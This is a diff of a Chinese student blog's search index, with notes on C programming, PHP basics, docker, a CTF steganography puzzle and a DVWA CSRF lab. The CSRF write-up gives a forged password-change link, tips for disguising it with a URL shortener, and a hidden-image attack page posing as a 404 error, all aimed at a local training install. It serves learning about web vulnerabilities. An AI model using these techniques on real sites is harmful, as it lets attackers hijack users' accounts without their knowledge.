@@ -1,37 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>C语言求余问题</title>
-    <url>/2020/11/02/c/C%E6%B1%82%E4%BD%99%E5%BE%97%E5%90%84%E4%B8%AA%E4%BD%8D/</url>
-    <content><![CDATA[<h4 id="c语言中-a为一个四位数-那么a-1000-100是啥"><a href="#c语言中-a为一个四位数-那么a-1000-100是啥" class="headerlink" title="c语言中 a为一个四位数 那么a%1000/100是啥"></a>c语言中 a为一个四位数 那么a%1000/100是啥</h4><p>假设a的值为1345，那么当a%1000，值为345，那么345/100，结果就是3；<br>所以这个算法是用来取得这个四位数的百位数值</p>
-<p>同样的思想应用在水仙花数上，取百位，十位，个位上的数分别为</p>
-<p>a，b，c，d</p>
-<p>b=a/100；</p>
-<p>c=a/10%10;</p>
-<p>d=a%10;</p>
-]]></content>
-      <tags>
-        <tag>c</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>二维数组</title>
-    <url>/2020/11/08/c/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</url>
-    <content><![CDATA[<p> 二维数组（矩阵）</p>
-<p>例子：int a[6] [6] ;//6*6,6行6列</p>
-<p>访问二维数组 </p>
-<p>例子: a[0] [0] 访问a数组，第一行第一列中的元素</p>
-<p>注意防止越界访问（取值范围）</p>
-<p>二维数组初始化，可用嵌套语句for</p>
-<p>二维数组也可以对部分元素赋值</p>
-<p>如 int a[3] [4]="{{1}，{5}，{9}}"每一列第一个数</p>
-<p>二维数组的[ ] [ ]第一个“[ ]”可以不写</p>
-]]></content>
-      <tags>
-        <tag>c</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>C语言注</title>
     <url>/2020/10/18/c/C%E8%AF%AD%E8%A8%80%E6%B3%A8/</url>
     <content><![CDATA[<p>1.(！flag) 等价于 (flag==0)<br>2.while(n)  是什么意思？<br>首先，n在这里被当作了一个条件<br>其次，当n为真时，进入while循环体（A）；否则跳出循环继续执行下面部分（B）。<br>while（n）<br>｛<br>循环体；//标识为A<br>｝<br>语句1；//标识为B<br>语句2；<br>3.如何用C语言将字符型数字转化成数值型数字<br>‘2’       通过     ‘2’ - ’0’ = 2<br>4.对于二维数组如何将什么上三角、下三角的值进行修改<br>考虑对角线很重要<br>比如 5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>正三角线：左到右，i=j<br>反三角线：右到左，i+j=n-1<br>取大于等于或者小于等于号时就可以实现上三角之类的数操作</p>
@@ -140,6 +109,37 @@
       </tags>
   </entry>
   <entry>
+    <title>C语言求余问题</title>
+    <url>/2020/11/02/c/C%E6%B1%82%E4%BD%99%E5%BE%97%E5%90%84%E4%B8%AA%E4%BD%8D/</url>
+    <content><![CDATA[<h4 id="c语言中-a为一个四位数-那么a-1000-100是啥"><a href="#c语言中-a为一个四位数-那么a-1000-100是啥" class="headerlink" title="c语言中 a为一个四位数 那么a%1000/100是啥"></a>c语言中 a为一个四位数 那么a%1000/100是啥</h4><p>假设a的值为1345，那么当a%1000，值为345，那么345/100，结果就是3；<br>所以这个算法是用来取得这个四位数的百位数值</p>
+<p>同样的思想应用在水仙花数上，取百位，十位，个位上的数分别为</p>
+<p>a，b，c，d</p>
+<p>b=a/100；</p>
+<p>c=a/10%10;</p>
+<p>d=a%10;</p>
+]]></content>
+      <tags>
+        <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>二维数组</title>
+    <url>/2020/11/08/c/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</url>
+    <content><![CDATA[<p> 二维数组（矩阵）</p>
+<p>例子：int a[6] [6] ;//6*6,6行6列</p>
+<p>访问二维数组 </p>
+<p>例子: a[0] [0] 访问a数组，第一行第一列中的元素</p>
+<p>注意防止越界访问（取值范围）</p>
+<p>二维数组初始化，可用嵌套语句for</p>
+<p>二维数组也可以对部分元素赋值</p>
+<p>如 int a[3] [4]="{{1}，{5}，{9}}"每一列第一个数</p>
+<p>二维数组的[ ] [ ]第一个“[ ]”可以不写</p>
+]]></content>
+      <tags>
+        <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>函数递归</title>
     <url>/2020/11/14/c/%E5%87%BD%E6%95%B0%E9%80%92%E5%BD%92/</url>
     <content><![CDATA[<p> 递归思想</p>
@@ -193,20 +193,21 @@
       </tags>
   </entry>
   <entry>
-    <title>指针</title>
-    <url>/2020/11/08/c/%E6%8C%87%E9%92%88/</url>
-    <content><![CDATA[<p> 指针和指针变量</p>
-<p>char *pa;//  定义一个指向字符型的指针变量；</p>
-<p>int *pb;//   定义一个指向整型的指针变量；</p>
-<p>取地址运算符  &amp;</p>
-<p>取值运算符   *</p>
-<p>未理解的</p>
-<p>（now，a）</p>
-<p>( the addr of a is)</p>
-<p>避免访问未初始化的指针</p>
+    <title>程序实验三</title>
+    <url>/2020/11/12/c/%E7%A8%8B%E5%BA%8F%E5%AE%9E%E9%AA%8C%E4%B8%89/</url>
+    <content><![CDATA[<p> 1、整数取反时，可用到reverse函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int reverse(int n)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​          int temp&#x3D;0;</span><br><span class="line">​	while (n!&#x3D;0)</span><br><span class="line">​	&#123;</span><br><span class="line">​		temp&#x3D;temp*10+n%10;</span><br><span class="line">​		n&#x3D;n&#x2F;10;</span><br><span class="line">​		</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	return temp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2、倒金字塔</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int i,n,j;</span><br><span class="line">	printf(&quot;请输入一个整数: \n&quot;);</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">	for(i&#x3D;1;i&lt;&#x3D;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">	  for(j&#x3D;1;j&lt;i;j++)</span><br><span class="line">	    printf(&quot; &quot;);</span><br><span class="line">     	for(j&#x3D;2*n-1;j&gt;&#x3D;2*i-1;j--)</span><br><span class="line">     	printf(&quot;*&quot;);</span><br><span class="line">	     printf(&quot;\n&quot;); </span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3、求和</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int a,n,i,j,sum;</span><br><span class="line">	printf(&quot;请输入两个整数分别为a&#x3D; n&#x3D; \n&quot;);</span><br><span class="line">	scanf(&quot;%d %d&quot;,&amp;a,&amp;n);</span><br><span class="line">	sum&#x3D;0,j&#x3D;0;</span><br><span class="line">	for(i&#x3D;1;i&lt;&#x3D;n;i++)</span><br><span class="line">		j&#x3D;j*10+a;</span><br><span class="line">		sum&#x3D;sum+j;</span><br><span class="line">		printf(&quot;a+aa+aaa+.....&#x3D;%d\n&quot;,sum);</span><br><span class="line">	&#125; </span><br><span class="line">	return 0;</span><br></pre></td></tr></table></figure>
+
+
 ]]></content>
       <tags>
-        <tag>指针</tag>
+        <tag>c</tag>
       </tags>
   </entry>
   <entry>
@@ -230,21 +231,20 @@
       </tags>
   </entry>
   <entry>
-    <title>程序实验三</title>
-    <url>/2020/11/12/c/%E7%A8%8B%E5%BA%8F%E5%AE%9E%E9%AA%8C%E4%B8%89/</url>
-    <content><![CDATA[<p> 1、整数取反时，可用到reverse函数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int reverse(int n)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​          int temp&#x3D;0;</span><br><span class="line">​	while (n!&#x3D;0)</span><br><span class="line">​	&#123;</span><br><span class="line">​		temp&#x3D;temp*10+n%10;</span><br><span class="line">​		n&#x3D;n&#x2F;10;</span><br><span class="line">​		</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	return temp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>2、倒金字塔</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int i,n,j;</span><br><span class="line">	printf(&quot;请输入一个整数: \n&quot;);</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">	for(i&#x3D;1;i&lt;&#x3D;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">	  for(j&#x3D;1;j&lt;i;j++)</span><br><span class="line">	    printf(&quot; &quot;);</span><br><span class="line">     	for(j&#x3D;2*n-1;j&gt;&#x3D;2*i-1;j--)</span><br><span class="line">     	printf(&quot;*&quot;);</span><br><span class="line">	     printf(&quot;\n&quot;); </span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>3、求和</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int a,n,i,j,sum;</span><br><span class="line">	printf(&quot;请输入两个整数分别为a&#x3D; n&#x3D; \n&quot;);</span><br><span class="line">	scanf(&quot;%d %d&quot;,&amp;a,&amp;n);</span><br><span class="line">	sum&#x3D;0,j&#x3D;0;</span><br><span class="line">	for(i&#x3D;1;i&lt;&#x3D;n;i++)</span><br><span class="line">		j&#x3D;j*10+a;</span><br><span class="line">		sum&#x3D;sum+j;</span><br><span class="line">		printf(&quot;a+aa+aaa+.....&#x3D;%d\n&quot;,sum);</span><br><span class="line">	&#125; </span><br><span class="line">	return 0;</span><br></pre></td></tr></table></figure>
-
-
+    <title>指针</title>
+    <url>/2020/11/08/c/%E6%8C%87%E9%92%88/</url>
+    <content><![CDATA[<p> 指针和指针变量</p>
+<p>char *pa;//  定义一个指向字符型的指针变量；</p>
+<p>int *pb;//   定义一个指向整型的指针变量；</p>
+<p>取地址运算符  &amp;</p>
+<p>取值运算符   *</p>
+<p>未理解的</p>
+<p>（now，a）</p>
+<p>( the addr of a is)</p>
+<p>避免访问未初始化的指针</p>
 ]]></content>
       <tags>
-        <tag>c</tag>
+        <tag>指针</tag>
       </tags>
   </entry>
   <entry>
@@ -275,43 +275,13 @@
       </tags>
   </entry>
   <entry>
-    <title>csrf</title>
-    <url>/2021/02/22/dvwa/csrf/</url>
-    <content><![CDATA[<p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery）</p>
-<p>感觉似曾相识，直到看到下面的话:</p>
-<p>跟<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC/23316003">跨网站脚本</a>（XSS）相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是<a href="https://baike.baidu.com/item/%E7%BD%91%E7%AB%99/155722">网站</a>对用户<a href="https://baike.baidu.com/item/%E7%BD%91%E9%A1%B5%E6%B5%8F%E8%A7%88%E5%99%A8/8309940">网页浏览器</a>的信任。</p>
-<p>跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了web中用户身份验证的一个漏洞：<strong>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的</strong>。</p>
-<p>啊，这样与以前在电脑和手机上看见那些不怀好意的链接（别问我怎么看出来的），就是诱导单纯的人去点，原来有这么高大上的名字，有点小尴尬，之前我都按木马来理解……</p>
-<p>对于dvwa的csrf这关，我查阅了几篇博客。</p>
-<h2 id="Low"><a href="#Low" class="headerlink" title="**Low*\***"></a><strong><em>*</em>*Low*\</strong>***</h2><p>服务器端核心代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line"></span><br><span class="line">    $pass_new  &#x3D; $_GET[ &#39;password_new&#39; ]; </span><br><span class="line"></span><br><span class="line">    $pass_conf &#x3D; $_GET[ &#39;password_conf&#39; ]; </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; Do the passwords match? </span><br><span class="line"></span><br><span class="line">    if( $pass_new &#x3D;&#x3D; $pass_conf ) &#123; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; They do! </span><br><span class="line"></span><br><span class="line">        $pass_new &#x3D; mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new &#x3D; md5( $pass_new ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Update the database </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $insert &#x3D; &quot;UPDATE &#96;users&#96; SET password &#x3D; &#39;$pass_new&#39; WHERE user &#x3D; &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $result &#x3D; mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         &#x2F;&#x2F; Feedback for the user </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    else &#123; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Issue with passwords matching </span><br><span class="line"></span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p> 可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现= =）。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="**漏洞利用*\***"></a><strong><em>*</em>*漏洞利用*\</strong>***</h2><p>1、构造链接</p>
-<p>A) 最基础的:</p>
-<p><a href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</a></p>
-<p>当受害者点击了这个链接，他的密码就会被改成123（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了）</p>
-<p><a href="http://image.3001.net/images/20161031/14778953244372.png"><img src="http://image.3001.net/images/20161031/14778953244372.png!small" alt="1.png"></a> </p>
-<p>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p>
-<p><a href="http://image.3001.net/images/20161031/14778953704168.png"><img src="http://image.3001.net/images/20161031/14778953704168.png!small" alt="1.png"></a></p>
-<p>有人会说，这个链接也太明显了吧，不会有人点的，没错，所以真正攻击场景下，我们需要对链接做一些处理。</p>
-<p>B) 我们可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）：</p>
-<p>如<a href="http://dwz.cn/">http://dwz.cn/</a>****</p>
-<p><a href="http://image.3001.net/images/20161031/14778954786668.png"><img src="http://image.3001.net/images/20161031/14778954786668.png!small" alt="1.png"></a></p>
-<p>因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接= =，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的。</p>
-<p><a href="http://image.3001.net/images/20161031/14778955097586.png"><img src="http://image.3001.net/images/20161031/14778955097586.png!small" alt="1.png"></a> </p>
-<p>需要提醒的是，虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。</p>
-<p>C) 构造攻击页面</p>
-<p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;hack&amp;password_conf&#x3D;hack&amp;Change&#x3D;Change#&quot; border&#x3D;&quot;0&quot; style&#x3D;&quot;display:none;&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。</p>
-<p><a href="http://image.3001.net/images/20161031/14778955408376.png"><img src="http://image.3001.net/images/20161031/14778955408376.png!small" alt="1.png"></a> </p>
+    <title>docker</title>
+    <url>/2021/04/25/docker/docker/</url>
+    <content><![CDATA[<p><a href="https://blog.csdn.net/q610376681/article/details/90483576?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161934162316780271527251%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161934162316780271527251&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-3-90483576.first_rank_v2_pc_rank_v29&amp;utm_term=docker&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/q610376681/article/details/90483576?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161934162316780271527251%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161934162316780271527251&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-3-90483576.first_rank_v2_pc_rank_v29&amp;utm_term=docker&amp;spm=1018.2226.3001.4187</a></p>
+<p>这篇文章不错喔</p>
 ]]></content>
       <tags>
-        <tag>dvwa</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -398,6 +368,46 @@
 ]]></content>
       <tags>
         <tag>nep</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>csrf</title>
+    <url>/2021/02/22/dvwa/csrf/</url>
+    <content><![CDATA[<p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery）</p>
+<p>感觉似曾相识，直到看到下面的话:</p>
+<p>跟<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC/23316003">跨网站脚本</a>（XSS）相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是<a href="https://baike.baidu.com/item/%E7%BD%91%E7%AB%99/155722">网站</a>对用户<a href="https://baike.baidu.com/item/%E7%BD%91%E9%A1%B5%E6%B5%8F%E8%A7%88%E5%99%A8/8309940">网页浏览器</a>的信任。</p>
+<p>跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了web中用户身份验证的一个漏洞：<strong>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的</strong>。</p>
+<p>啊，这样与以前在电脑和手机上看见那些不怀好意的链接（别问我怎么看出来的），就是诱导单纯的人去点，原来有这么高大上的名字，有点小尴尬，之前我都按木马来理解……</p>
+<p>对于dvwa的csrf这关，我查阅了几篇博客。</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="**Low*\***"></a><strong><em>*</em>*Low*\</strong>***</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line"></span><br><span class="line">    $pass_new  &#x3D; $_GET[ &#39;password_new&#39; ]; </span><br><span class="line"></span><br><span class="line">    $pass_conf &#x3D; $_GET[ &#39;password_conf&#39; ]; </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; Do the passwords match? </span><br><span class="line"></span><br><span class="line">    if( $pass_new &#x3D;&#x3D; $pass_conf ) &#123; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; They do! </span><br><span class="line"></span><br><span class="line">        $pass_new &#x3D; mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new &#x3D; md5( $pass_new ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Update the database </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $insert &#x3D; &quot;UPDATE &#96;users&#96; SET password &#x3D; &#39;$pass_new&#39; WHERE user &#x3D; &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $result &#x3D; mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         &#x2F;&#x2F; Feedback for the user </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    else &#123; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Issue with passwords matching </span><br><span class="line"></span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现= =）。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="**漏洞利用*\***"></a><strong><em>*</em>*漏洞利用*\</strong>***</h2><p>1、构造链接</p>
+<p>A) 最基础的:</p>
+<p><a href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</a></p>
+<p>当受害者点击了这个链接，他的密码就会被改成123（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了）</p>
+<p><a href="http://image.3001.net/images/20161031/14778953244372.png"><img src="http://image.3001.net/images/20161031/14778953244372.png!small" alt="1.png"></a> </p>
+<p>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p>
+<p><a href="http://image.3001.net/images/20161031/14778953704168.png"><img src="http://image.3001.net/images/20161031/14778953704168.png!small" alt="1.png"></a></p>
+<p>有人会说，这个链接也太明显了吧，不会有人点的，没错，所以真正攻击场景下，我们需要对链接做一些处理。</p>
+<p>B) 我们可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）：</p>
+<p>如<a href="http://dwz.cn/">http://dwz.cn/</a>****</p>
+<p><a href="http://image.3001.net/images/20161031/14778954786668.png"><img src="http://image.3001.net/images/20161031/14778954786668.png!small" alt="1.png"></a></p>
+<p>因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接= =，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的。</p>
+<p><a href="http://image.3001.net/images/20161031/14778955097586.png"><img src="http://image.3001.net/images/20161031/14778955097586.png!small" alt="1.png"></a> </p>
+<p>需要提醒的是，虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。</p>
+<p>C) 构造攻击页面</p>
+<p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;hack&amp;password_conf&#x3D;hack&amp;Change&#x3D;Change#&quot; border&#x3D;&quot;0&quot; style&#x3D;&quot;display:none;&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。</p>
+<p><a href="http://image.3001.net/images/20161031/14778955408376.png"><img src="http://image.3001.net/images/20161031/14778955408376.png!small" alt="1.png"></a> </p>
+]]></content>
+      <tags>
+        <tag>dvwa</tag>
       </tags>
   </entry>
   <entry>
@@ -512,130 +522,76 @@
       </tags>
   </entry>
   <entry>
-    <title>php</title>
-    <url>/2021/02/14/php/php/</url>
-    <content><![CDATA[<h4 id="echo-和-print-区别"><a href="#echo-和-print-区别" class="headerlink" title="echo 和 print 区别:"></a>echo 和 print 区别:</h4><ul>
-<li>echo     - 可以输出一个或多个字符串</li>
-<li>print     - 只允许输出一个字符串，返回值总为 1</li>
-</ul>
-<p><strong>提示：</strong>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。(php与C语言有相同之处)</p>
-<h4 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h4><p>index是普遍意义上的“首页”，也就是你输入一个域名后会打开一个页面，基本上就是index.xxxx（基本上首页都不会把index.xxxx显示在url里，但也不绝对）</p>
-<p>后面的php是“Hypertext Preprocessor”，一个脚本语言，与asp、jsp一样是用来处理网站各种事物的程序。</p>
-<h4 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h4><p>双引号里的语句变量能够被识别；</p>
-<p>单引号里的语句变量不能够被识别；</p>
-<p>example：$a=’1’;</p>
-<p>​          echo “123 $a”;——浏览器打印为123 1</p>
-<p>​         echo “123 $a”;——浏览器打印为123 $a</p>
-<?php
-
-$a = 'hello';                                              
-
-$b = 'world';
-
-$c = $a.' '.$b;
-
-echo $c;
-
-?>
-
-<p>var_dump($a, $b, $c, 123, 2.2);</p>
-<p>调试使用，可输出数据类型        字符串连接且加空格‘ ’</p>
-<p>$a = (string)1;</p>
-<p>数值左边括号里为想要强行转换的数据类型，在这过程中可能会有损失。</p>
+    <title>新手区</title>
+    <url>/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
+    <content><![CDATA[<h4 id="stegnao"><a href="#stegnao" class="headerlink" title="stegnao"></a>stegnao</h4><p>打开后文档如图</p>
+<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(120).png"></p>
+<p>明显没有flag，试着用编辑器看了下，找到隐含文字</p>
+<p>Creator(LaTeX /o/)/Producer(find mr.morse text)/Keywords(Could this be the flag? : Tm9wZSAsIG5vdCBoZXJlIDspCg==)</p>
+<p>看上去像是base64，解码后果然没那么简单，提示信息flag也不在这里</p>
+<p>那么我们再从文本出发</p>
+<p>ctrl+a后到文本中，有线索了！</p>
+<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(121).png"></p>
+<p>出现了诸如BA的排列组合，联想到之前的文字里：**(find mr.morse text)**提示我们摩斯电码</p>
+<p>这里刚好莫斯电码就是以 - 和 . 来表达信息的，于是我们进行替换</p>
